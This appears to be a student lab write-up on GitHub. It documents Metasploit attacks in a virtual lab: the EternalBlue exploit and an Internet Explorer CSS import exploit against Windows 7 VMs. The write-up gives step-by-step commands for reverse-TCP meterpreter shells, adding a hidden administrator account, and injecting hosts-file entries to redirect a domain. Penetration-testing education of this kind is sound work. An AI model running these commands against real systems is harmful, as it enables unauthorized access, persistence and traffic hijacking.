
## Project Showcase: Metasploit Attack #1 - Eternal Blue

### Objective:
Demonstrated the exploitation of the EternalBlue vulnerability using Metasploit on a Kali Linux virtual machine (VM) to compromise a Windows 7 VM.

### Skills Learned:
- Vulnerability exploitation
- Network scanning and reconnaissance
- Payload configuration
- Post-exploitation tasks
- User privilege escalation
- Using Metasploit and Armitage tools

### Tools Used:
- Kali Linux VM
- Metasploit Framework
- Armitage
- Windows 7 VM
- Windows XP VM
- Ping and networking utilities

### Steps to Execute the Attack:

#### Initial Setup:

1. **Login to Kali VM:**
   - Username: `root`
   - Password: `toor`
   - If the desktop locked due to inactivity, pressed `Enter` and re-entered the password.

   **Explanation:**
   Logged in as root to have the necessary privileges to perform the exploitation tasks.

2. **Open Terminal:**
   - Clicked the terminal icon on the left toolbar (second from the top).

   **Explanation:**
   The terminal was where all commands were executed to interact with the Metasploit framework and perform network diagnostics.

3. **Verify Connectivity:**
   - Ran `ping –c 4 10.1.188.217` to check communication with the Win7 VM.

   
   **Explanation:**
   Ensured network connectivity between the attacker (Kali) and the target (Win7) for the exploitation to work. The ping command output shows successful packet transmission, confirming that the target VM is reachable.


#### Exploit Execution:

4. **Start Metasploit Console:**
   - Navigated to `Application | Exploitation Tools | Metasploit`.


   **Explanation:**
   Metasploit was the primary tool used to exploit the EternalBlue vulnerability.


5. **Load the EternalBlue Exploit:**
   - Ran `use exploit/windows/smb/ms17_010_eternalblue`.


   **Explanation:**
   This command loaded the EternalBlue exploit module, which targeted the SMB vulnerability on the Windows 7 machine.


6. **Configure Exploit Options:**
   - Ran `show options` to view necessary configurations.
   - Set the target IP address: `set rhost 10.1.188.217`.


   **Explanation:**
   Specified the IP address of the target machine (RHOST) so that Metasploit knew which machine to attack. This screenshot shows the configuration details of the EternalBlue exploit.

7. **Configure Payload:**
   - Set the payload: `set payload windows/x64/meterpreter/reverse_tcp`.
   - Set the local host IP: `set lhost 10.1.188.184`.
   - Set the local port: `set lport 8888`.

   **Explanation:**
   The payload determined the actions performed post-exploit. Reverse TCP meterpreter was chosen to establish a connection back to the attacker’s machine, reducing firewall detection chances.

8. **Verify Configuration:**
   - Ran `show options` again to confirm settings.


   **Explanation:**
   Re-verified options to ensure that all necessary parameters were correctly set before launching the exploit.

9. **Launch the Exploit:**
   - Ran `exploit`.

   **Explanation:**
   This command initiated the exploit, attempting to leverage the EternalBlue vulnerability to gain control over the target system.

10. **Capture Meterpreter Prompt:**



    <img width="500" alt="Screenshot 2024-04-29 at 5 53 05 PM" src="https://github.com/Mofaal/eternalblue-exploitation/assets/137732122/c5041ad8-8fc8-4080-a2ce-8fceac7744a8">

    
- This is when the `meterpreter>` prompt appeared.


**Explanation:**
    The meterpreter prompt indicated a successful exploitation, providing an interactive shell on the compromised machine. This prompt confirms that the exploit was successful.

#### Post-Exploit Actions:

1. **Gather System Information:**

   <img width="600" alt="Screenshot 2024-04-29 at 5 58 49 PM" src="https://github.com/Mofaal/eternalblue-exploitation/assets/137732122/d14e2128-e838-48a6-9f90-8d22caca7185">

   - Ran `sysinfo` at the `meterpreter>` prompt.
   - This is a screenshot of the output.
     
   **Explanation:**
   Gathering system information helped to understand the target environment and confirm successful exploitation. The output displays critical system details such as OS version, architecture, and hostname.

2. **Capture Victim's Desktop:**

      <img width="500" alt="Screenshot 2024-06-08 at 7 51 28 AM" src="https://github.com/Mofaal/eternalblue-exploitation/assets/137732122/85a4195e-3c7c-4088-a893-67c229a8c4ba">

   - Ran `screenshot` at the `meterpreter>` prompt.
   - Noted the file name and took a screenshot of the MSF console.

   **Explanation:**
   Capturing the victim’s desktop was a way to visually confirm access and control over the target machine. This screenshot shows the desktop image captured by the meterpreter `screenshot` command.

3. **Obtain a Shell:**

   - Ran `shell` at the `meterpreter>` prompt.
   - Confirmed the working directory path.

     
   **Explanation:**
   The prompt displays `C:\Windows\System32>`, indicating that the current working directory on the Windows 7 VM is `C:\Windows\System32`. This is crucial for understanding the context in which commands are executed, as it determines the scope and accessibility of system files and directories. By knowing the working directory, you can effectively navigate the file system and execute commands within the correct context, ensuring that any operations are performed in the intended directory.

4. **Create the C:\hacked Folder:**

   <img width="500" alt="Screenshot 2024-06-08 at 7 57 14 AM" src="https://github.com/Mofaal/eternalblue-exploitation/assets/137732122/f209ad5f-9dba-485a-8513-a5e2520b33a2">

   - Executed `mkdir C:\hacked` in the shell.

   **Explanation:**
   This screenshot shows the successful creation of the `C:\hacked` folder in the Windows 7 VM.

#### Post-Exploit:

1. **Create a New Account and Add to Administrators Group:**

   <img width="500" alt="Screenshot 2024-04-29 at 6 04 39 PM" src="https://github.com/Mofaal/eternalblue-exploitation/assets/137732122/ffbca30d-6fb8-4060-b98f-7b4e98426a0c">

   - Ran `net user Your_First_Name Your_Password /add` and `net localgroup administrators Your_First_Name /add`.

   **Explanation:**
   The screenshot shows the newly created user account named 'mohammad', which has been successfully added to the administrators' group, granting it administrative privileges on the system.

3. **Meterpreter VM Detection:**
   
   <img width="487" alt="Screenshot 2024-06-08 at 8 51 18 AM" src="https://github.com/Mofaal/eternalblue-exploitation/assets/137732122/23c2f614-ed0d-4c26-9721-051fbf3c3aec">

   - Ran `run post/windows/gather/checkvm` at the `meterpreter>` prompt.

   **Explanation:**
   The output from the `checkvm` script confirms that the target is indeed a virtual machine. This verification is crucial for understanding the environment and adjusting the attack strategy accordingly.
   
6. **Modify Hosts File:**
   
   <img width="511" alt="Screenshot 2024-06-08 at 8 53 08 AM" src="https://github.com/Mofaal/eternalblue-exploitation/assets/137732122/0a250869-f1d2-4019-8786-049c15116585">

    
   
   - Ran `run post/windows/manage/inject_host domain=cob.unt.edu ip=10.1.188.184`.
     
   **Explanation:**
   This screenshot shows the injection of a new record into the hosts file, mapping the domain `cob.unt.edu` to the IP address `10.1.188.184`. This modification is crucial for redirecting network traffic intended for `cob.unt.edu` to the attacker's machine, facilitating further exploitation or data exfiltration. By altering the hosts file, you can effectively manipulate DNS resolution, ensuring that requests to the specified domain are directed to the attacker's IP address, bypassing any DNS servers or external name resolution services.

### IE CSS Import Attack:

1. **Load the IE CSS Import Exploit:**
   - Ran `use exploit/windows/browser/ms11_003_ie_css_import`.

   <img width="396" alt="Screenshot 2024-06-08 at 9 08 28 AM" src="https://github.com/Mofaal/eternalblue-exploitation/assets/137732122/4271c781-c38f-4dd7-861a-228895d7d299">


   **Explanation:**
   Loading a different exploit module demonstrated versatility in attack strategies. This module targets a specific Internet Explorer vulnerability.

2. **Configure Exploit Options:**
   - Set the payload: `set payload windows/meterpreter/reverse_tcp`.
   - Set the local port: `set srvport 80`.
   - Set the URI path: `set uripath /itds`.
   - Set the local host IP: `set lhost 10.1.188.184`.

   <img width="382" alt="Screenshot 2024-06-08 at 9 09 31 AM" src="https://github.com/Mofaal/eternalblue-exploitation/assets/137732122/0586de35-70a3-471d-aa09-a7d293a51f59">



   **Explanation:**
   Configuring the exploit with appropriate options ensured it targeted the correct service and delivered the payload effectively. The screenshot shows the specific settings used.

4. **Launch the IE CSS Import Exploit:**
   - Ran `exploit`.

   **Explanation:**
   This command initiated the IE CSS Import exploit, attempting to compromise the target through a web browser vulnerability. 

5. **Trigger the Exploit in Win7 VM:**

   - Opened Internet Explorer and navigated to `http://cob.unt.edu/itds`.
   - Closed the browser after the exploit triggered.


   **Explanation:**
   This screenshot shows the IE browser navigating to the exploit URL, confirming the exploit was triggered.
   
   <img width="500" alt="Screenshot 2024-04-29 at 6 23 53 PM" src="https://github.com/Mofaal/eternalblue-exploitation/assets/137732122/599c812e-0334-4db0-9b7e-c24e84518cf8">
--- 
### Conclusion

In our project, we conducted advanced penetration testing techniques using Metasploit and Armitage to exploit vulnerabilities in a Windows 7 VM. We started by exploiting the EternalBlue vulnerability (`ms17_010_eternalblue`) to gain initial access to the target system. We configured the Metasploit Framework with the appropriate payload and target IP address, which allowed us to establish a Meterpreter session and execute post-exploitation commands. We then created a new user account named 'mohammad' with administrative privileges, checked the virtual machine status using the `checkvm` script, and modified the victim's hosts file to redirect `cob.unt.edu` to our attacker's IP address, paving the way for further network manipulation and exploitation.

Additionally, we used the IE CSS Import vulnerability (`ms11_003_ie_css_import`) to compromise the Windows 7 VM through a browser-based attack and set up a reverse TCP connection to maintain access. With Armitage, we conducted a quick scan to identify vulnerabilities on the Windows XP VM and successfully executed the `ms08_067_netapi` attack, confirming the compromise. We documented each step with detailed screenshots, demonstrating our approach to exploiting and controlling the target system. This project highlighted the significance of patch management and system hardening in defending against such exploits, showcasing our proficiency in network security, vulnerability assessment, and exploit development.
